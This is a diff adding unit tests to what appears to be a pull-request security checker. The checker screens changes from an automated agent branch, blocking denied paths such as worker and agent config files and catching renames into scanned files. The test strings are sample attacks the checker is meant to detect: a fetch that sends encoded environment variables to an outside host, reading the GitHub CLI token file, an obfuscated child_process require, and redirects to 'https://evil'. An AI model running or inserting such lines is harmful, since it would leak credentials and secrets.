@@ -87,9 +87,19 @@ class Fails(unittest.TestCase):
                      "functions/api/x.js", "tests/browser.mjs", "tests/serve.mjs"]:
             self.assertFlags([f(path, "modified", added("x"))], needle=path)
 
+    def test_pages_worker_and_wrangler_json_are_denied(self):
+        for path in ["public/_worker.js", "public/_worker.js/index.js", "wrangler.json", "wrangler.jsonc"]:
+            self.assertFlags([f(path, "added", added("x"))], needle=path)
+
     def test_removing_or_renaming_away_from_a_denied_path_fails(self):
         self.assertFlags([f(".github/workflows/unsafe-change.yml", "removed")])
         self.assertFlags([f("docs/x.yml", "renamed", previous_filename=".github/workflows/ci.yml")])
+
+    def test_pages_worker_wrangler_and_agent_files_are_denied(self):
+        for path in ["public/_worker.js", "public/_worker.js/index.js", "wrangler.json", "wrangler.jsonc",
+                     ".mcp.json", "CLAUDE.local.md", "makefile", "dockerfile", "GNUmakefile",
+                     "requirements/003-new-task.md"]:
+            self.assertFlags([f(path, "added", added("x"))], needle=path)
 
     def test_secret_and_auth_paths(self):
         for path in ["src/auth.rs", "backend/app/oauth/google.py", "src/middleware/auth.ts", "lib/tokens.dart",
@@ -173,6 +183,30 @@ class Fails(unittest.TestCase):
         self.assertEqual(ev(big, {("public/game.js", "head"): "function ok() {}\n"}), [])
         self.assertFlags(big, {("public/game.js", "head"): "const k = process.env.X;\n"}, "process/env/socket")
 
+    def test_added_lines_starting_with_plus_plus_are_scanned(self):
+        self.assertTrue(ev([f("tests/smoke.cjs", "modified",
+                              added("++[].length, require('child_process').execSync('id')"))]))
+
+    def test_renaming_a_full_manifest_into_place_fails(self):
+        cargo = '[package]\nname = "x"\n[dependencies]\nevil = "1"\n'
+        self.assertTrue(ev([f("Cargo.toml", "renamed", previous_filename="notes.txt")],
+                           {("notes.txt", "base"): cargo, ("Cargo.toml", "head"): cargo}))
+
+    def test_renaming_an_unscanned_file_into_a_scanned_extension_scans_it(self):
+        js = "require('child_process').execSync('id')"
+        self.assertTrue(ev([f("tests/helper.cjs", "renamed", previous_filename="notes.txt", changes=0)],
+                           {("tests/helper.cjs", "head"): js}))
+
+    def test_exfiltration_primitives_in_added_lines(self):
+        for line in ["fetch('https://x/' + btoa(JSON.stringify(process['env'])))",
+                     "require('fs').readFileSync(require('os').homedir() + '/.config/gh/hosts.yml')",
+                     "const cp = require('node:' + 'child_pro' + 'cess')",
+                     "const {env} = process",
+                     "setTimeout(() => location.href = 'https://evil', 5000)"]:
+            self.assertTrue(ev([f("tests/smoke.cjs", "modified", added(line))]), line)
+        self.assertTrue(ev([f("public/index.html", "modified",
+                              added('<meta http-equiv="refresh" content="0;url=https://evil">'))]))
+
     def test_migrations_beyond_app_schema_changes(self):
         for sql in [
             "GRANT ALL ON SCHEMA events TO PUBLIC;",
@@ -208,6 +242,16 @@ class Screened(unittest.TestCase):
             {"number": 3, "labels": ["bug"]},
             {"number": 4, "labels": ["archon:auto-approved"]},
         ], POLICY), [1, 4])
+
+    def test_factory_prs_without_a_closing_reference_are_still_judged(self):
+        factory = {"head": {"ref": "archon/task-123"}, "user": {"login": "someone"}, "labels": []}
+        owner = {"head": {"ref": "alex/fix"}, "user": {"login": "alex"}, "labels": []}
+        approved = {"head": {"ref": "archon/task-123"}, "user": {"login": "someone"},
+                    "labels": [{"name": "archon:approved"}]}
+        self.assertTrue(check.applies(factory, [], POLICY))
+        self.assertFalse(check.applies(owner, [], POLICY))
+        self.assertFalse(check.applies(approved, [], POLICY))
+        self.assertTrue(check.applies(owner, [12], POLICY))
 
     def test_closing_keywords(self):
         self.assertEqual(sorted(int(m) for m in check.CLOSING_RE.findall("Fixes #12, closes #3 and resolved #7; not #9")), [3, 7, 12])
